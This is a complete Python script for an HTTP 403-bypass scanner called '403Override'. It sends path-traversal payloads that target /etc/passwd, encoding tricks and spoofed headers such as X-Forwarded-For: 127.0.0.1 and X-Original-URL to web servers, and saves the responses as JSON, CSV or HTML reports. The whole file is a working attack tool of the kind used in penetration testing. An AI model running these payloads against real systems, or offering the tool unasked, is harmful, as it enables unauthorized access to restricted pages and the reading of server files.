#!/usr/bin/env python3
import os
import sys
import argparse
import validators
import tldextract
import asyncio
import aiohttp
import json
import csv
from datetime import datetime
from aiohttp_proxy import ProxyConnector

# UI and Reporting Libraries
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from jinja2 import Template

console = Console()

class PathRepository:
    def __init__(self, path):
        self.path = path.rstrip("/") if path != "/" else "/"
        self.headers_to_test = self.load_list('headers.txt', ["X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host"])
        self.ip_values = self.load_list('ip_address.txt', ["127.0.0.1", "localhost", "0x7F000001"])
        self.new_paths = self.create_new_paths()
        self.new_headers = self.create_new_headers()

    def load_list(self, filename, defaults):
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return defaults

    def create_new_paths(self):
        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", ".json", ".css", ".html", "?", "??", "???", "?anyparam", "#", "#anything", "/.","..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "%252e%252e%252fetc%252fpasswd", "%252e%252e%252fetc%252fpasswd%00", "a/../../../../../../../../../etc/passwd......", "a/../../../../../../../../../../../../../../../../etc/passwd/././.", "a/./......../etc/passw", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd", "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"]
        paths = [self.path]
        for t in trailings: paths.append(f"{self.path}{t}")
        paths.extend([f"/{self.path}//", f"/.{self.path}/./", f"/%2e{self.path}"])
        return list(set(paths))

    def create_new_headers(self):
        new_headers = []
        for h in self.headers_to_test:
            for ip in self.ip_values: new_headers.append({h: ip})
        for h in ["X-Original-URL", "X-Rewrite-URL"]: new_headers.append({h: self.path})
        return new_headers

class Query:
    def __init__(self, url, path_repo, session, args, has_cookies):
        self.base_url = url.rstrip("/")
        self.path_repo = path_repo
        self.session = session
        self.args = args
        self.has_cookies = "Yes" if has_cookies else "No"
        self.results = []
        self.baseline_size = 0
        self.baseline_status = 0

    async def send_request(self, method, path, headers=None, is_baseline=False):
        url = f"{self.base_url}{path}"
        if self.args.delay > 0:
            await asyncio.sleep(self.args.delay / 1000)

        try:
            async with self.session.request(method, url, headers=headers, allow_redirects=False) as resp:
                content = await resp.read()
                text_content = content.decode('utf-8', errors='ignore')
                
                res = {
                    "method": method,
                    "url": url,
                    "headers": json.dumps(headers) if headers else "None",
                    "status": resp.status,
                    "size": len(content),
                    "cookies": self.has_cookies,
                    "note": ""
                }

                if is_baseline:
                    return res

                if self.args.grep and self.args.grep in text_content:
                    res["note"] += f"[Grep Hit] "
                if self.args.soft and resp.status != self.baseline_status:
                    res["note"] += f"Status Change "
                if res['size'] != self.baseline_size:
                    res["note"] += "Size Diff "

                return res
        except Exception:
            return None

    async def run(self, progress, task_id):
        if self.args.baseline:
            base = await self.send_request('GET', self.path_repo.path, is_baseline=True)
            if base:
                self.baseline_size = base['size']
                self.baseline_status = base['status']

        queue = [('POST', self.path_repo.path)]
        for p in self.path_repo.new_paths: queue.append(('GET', p))
        for h in self.path_repo.new_headers: queue.append(('GET', self.path_repo.path, h))

        progress.update(task_id, total=len(queue))
        
        for item in queue:
            method, path, *headers = item
            h = headers[0] if headers else None
            res = await self.send_request(method, path, headers=h)
            
            if res:
                if self.args.hide_size and res['size'] == self.baseline_size:
                    progress.advance(task_id)
                    continue
                self.results.append(res)
            progress.advance(task_id)

        return self.results

def save_reports(results, args):
    if not results:
        return

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    base_name = f"403override_{ts}"

    # JSON Output
    if args.json:
        fname = f"{base_name}.json"
        with open(fname, 'w') as f:
            json.dump(results, f, indent=4)
        console.print(f"[bold green][+] JSON report saved to: {fname}")

    # CSV Output
    if args.csv:
        fname = f"{base_name}.csv"
        with open(fname, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=results[0].keys())
            writer.writeheader()
            writer.writerows(results)
        console.print(f"[bold green][+] CSV report saved to: {fname}")

    # HTML Output
    if args.html:
        fname = f"{base_name}.html"
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>403Override Scan Report</title>
            <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background-color: #f8f9fa; }
                h2 { color: #343a40; }
                .status-200 { color: #28a745; font-weight: bold; }
                .status-403 { color: #dc3545; }
                .note-hit { background-color: #fff3cd; padding: 2px 5px; border-radius: 4px; font-size: 0.9em; }
            </style>
        </head>
        <body>
            <h2>403Override Scan Results - {{ ts }}</h2>
            <table id="resultsTable" class="display" style="width:100%">
                <thead>
                    <tr>
                        <th>Method</th><th>Status</th><th>Size</th><th>Cookies</th><th>Bypass Info</th><th>Note</th><th>URL</th>
                    </tr>
                </thead>
                <tbody>
                    {% for r in results %}
                    <tr>
                        <td>{{ r.method }}</td>
                        <td class="status-{{ r.status }}">{{ r.status }}</td>
                        <td>{{ r.size }}</td>
                        <td>{{ r.cookies }}</td>
                        <td><code>{{ r.headers }}</code></td>
                        <td><span class="note-hit">{{ r.note }}</span></td>
                        <td><a href="{{ r.url }}" target="_blank">{{ r.url }}</a></td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            <script src="https://code.jquery.com/jquery-3.7.0.js"></script>
            <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
            <script>$(document).ready(function() { $('#resultsTable').DataTable({ "pageLength": 50 }); });</script>
        </body>
        </html>
        """
        template = Template(html_template)
        with open(fname, 'w') as f:
            f.write(template.render(results=results, ts=ts))
        console.print(f"[bold green][+] Interactive HTML report saved to: {fname}")

async def start_scan(args):
    urls = [args.url] if args.url else []
    if args.urllist:
        with open(args.urllist, 'r') as f:
            urls.extend([line.strip() for line in f if validators.url(line.strip())])
    
    dirs = [args.dir] if args.dir else ["/"]
    cookie_dict = {n: v for c in (args.cookies or "").split(';') if '=' in c for n, v in [c.strip().split('=', 1)]}
    
    connector = ProxyConnector.from_url(args.proxy) if args.proxy else None
    all_final_results = []

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TaskProgressColumn(), console=console) as progress:
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=20)) as unauth_session, \
                   aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=20), cookies=cookie_dict) as auth_session:
            
            tasks = []
            for u in urls:
                for d in dirs:
                    repo = PathRepository(d)
                    if args.cookies:
                        t_id = progress.add_task(f"[cyan]Auth: {u}{d}", total=None)
                        tasks.append(Query(u, repo, auth_session, args, True).run(progress, t_id))
                    if args.unauth or not args.cookies:
                        t_id = progress.add_task(f"[white]Unauth: {u}{d}", total=None)
                        tasks.append(Query(u, repo, unauth_session, args, False).run(progress, t_id))

            results_lists = await asyncio.gather(*tasks)
            for r_list in results_lists: all_final_results.extend(r_list)

    # CLI Output
    table = Table(title="403Override - Summary", show_header=True, header_style="bold blue")
    table.add_column("Status", justify="center")
    table.add_column("Size", justify="right")
    table.add_column("Cookies")
    table.add_column("Bypass Info (Header/Value)", style="yellow")
    table.add_column("Note", style="bold cyan")
    table.add_column("URL", overflow="fold")

    for r in all_final_results:
        color = "green" if 200 <= r['status'] < 300 else "magenta" if r['status'] in [401, 403] else "white"
        table.add_row(f"[{color}]{r['status']}[/]", str(r['size']), r['cookies'], r['headers'], r['note'], r['url'])

    console.print(table)
    
    # Save the requested files
    save_reports(all_final_results, args)

def main():
    parser = argparse.ArgumentParser(description="403Override Scanner - Pro Version")
    parser.add_argument("-u", "--url", help="Single URL")
    parser.add_argument("-U", "--urllist", help="URL list file")
    parser.add_argument("-d", "--dir", help="Single directory")
    parser.add_argument("-t", "--threads", type=int, default=5)
    parser.add_argument("-c", "--cookies", help='Cookie string')
    parser.add_argument("--proxy", help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument("--delay", type=int, default=0, help="Delay in ms")
    parser.add_argument("--grep", help="String to find in response")
    parser.add_argument("--baseline", type=bool, default=True, help="Set baseline reference")
    parser.add_argument("--soft", action="store_true", help="Flag status code changes")
    parser.add_argument("--unauth", action="store_true", help="Run unauth alongside cookies")
    parser.add_argument("--hide-size", action="store_true", help="Hide results matching baseline size")
    
    # Output Arguments
    parser.add_argument("--json", action="store_true", help="Save output as JSON")
    parser.add_argument("--csv", action="store_true", help="Save output as CSV")
    parser.add_argument("--html", action="store_true", help="Save output as interactive HTML")
    
    args = parser.parse_args()
    if not args.url and not args.urllist:
        console.print("[bold red]Error: Provide -u or -U")
        return

    try:
        asyncio.run(start_scan(args))
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Aborted.")

if __name__ == "__main__":
    main()